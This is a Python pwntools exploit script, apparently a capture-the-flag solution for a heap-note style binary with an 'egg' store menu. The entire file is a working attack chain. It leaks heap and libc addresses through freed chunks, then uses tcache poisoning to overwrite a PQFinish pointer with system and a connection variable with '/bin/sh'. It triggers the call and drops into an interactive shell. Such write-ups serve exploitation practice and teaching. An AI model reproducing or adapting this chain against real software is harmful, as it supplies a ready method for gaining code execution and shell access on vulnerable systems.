#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def register(_login, _password):
    io.recvuntil(b'$ ')
    io.sendline(b'2')
    io.recvuntil(b': \n')
    io.sendline(_login)
    io.recvuntil(b': \n')
    io.sendline(_password)
    io.recvuntil(b': \n')
    io.sendline(_login)
    io.recvuntil(b': \n')
    io.sendline(_password)

def login(_login, _password):
    io.recvuntil(b'$ ')
    io.sendline(b'2')
    io.recvuntil(b': \n')
    io.sendline(_login)
    io.recvuntil(b': \n')
    io.sendline(_password)

def store_new(eggid, name, data):
    io.recvuntil(b'$ ')
    io.sendline(b'1')
    io.recvuntil(b': ')
    io.sendline(eggid)
    io.recvuntil(b': ')
    io.sendline(name)
    io.recvuntil(b': ')
    io.sendline(data)

def print_egg(eggid):
    io.recvuntil(b'$ ')
    io.sendline(b'2')
    io.recvuntil(b': ')
    io.sendline(eggid)
    io.recvuntil(b'(name): ')
    name = io.recvuntil(b'\n(data)')
    io.recvuntil(b': ')
    data = io.recvuntil(b'\n[-')
    return name, data
    
def edit_egg(eggid, name, data):
    io.recvuntil(b'$ ')
    io.sendline(b'3')
    io.recvuntil(b': ')
    io.sendline(eggid)
    io.recvuntil(b': ')
    io.sendline(name)
    io.recvuntil(b': ')
    io.sendline(data)

def delete_egg(eggid):
    io.recvuntil(b'$ ')
    io.sendline(b'4')
    io.recvuntil(b': ')
    io.sendline(eggid)

def edit_egg_data(eggid, data):
    io.recvuntil(b'$ ')
    io.sendline(b'6')
    io.recvuntil(b': ')
    io.sendline(eggid)
    io.recvuntil(b': ')
    io.sendline(data)


LIBC_REMOTE = './libc.so.6'

io = start()
libc = ELF(LIBC_REMOTE)

register(b'pwn1337', b'pwn')

for i in range(10):
    store_new(str(i).encode(), b'A'*32, b'B'*32)
for i in range(8):
    delete_egg(str(i).encode())

leak_heap, _ = print_egg(b"7")
leak_heap = u64(leak_heap.split(b'\n')[0].ljust(8, b'\x00'))
log.success(f'[+] HEAP LEAK: {hex(leak_heap)}')
edit_egg(b'7', b'X'*7, b'X'*7)

leak, _ = print_egg(b'7')

leak = u64(leak.split(b'\n')[1].ljust(8, b'\x00'))
libc_base = leak - 0x219ce0

log.success(f'[+] LIBC LEAK: {hex(leak)}')
log.success(f'[+] LIBC BASE: {hex(libc_base)}')
binsh = libc_base + next(libc.search(b'/bin/sh\0'))
log.success(f'LIBC /bin/sh: {hex(binsh)}')
system = libc_base + libc.symbols['system']
log.success(f'LIBC system: {hex(system)}')

# fix unsorted bin
edit_egg(b'7', p64(leak_heap)+p64(leak), p64(leak_heap)+p64(leak))

# clear all bins
for _ in range(15):
    store_new(b'0', b'A'*32, b'B'*32)

for i in range(10):
    store_new(str(i).encode(), b'A'*32, b'B'*32)
delete_egg(b'0')
delete_egg(b'1')
delete_egg(b'2')

# tcache poisoning
addr_heap = leak_heap + 0x1e60
value = (leak_heap + 0x2640) ^ (addr_heap >> 12)
edit_egg_data(b'2', p64(value))
store_new(b'0', b'A', b'A')
edit_egg_data(b'0', p64(0x4070b0)) # PQFinish rewrite
edit_egg_data(b'6', p64(system))
edit_egg_data(b'0', p64(0x407190)) # conn var
edit_egg_data(b'6', p64(binsh))

io.recvuntil(b'$ ')
io.sendline(b'2')
io.recvuntil(b': ')
io.sendline(b'1337')

io.interactive()
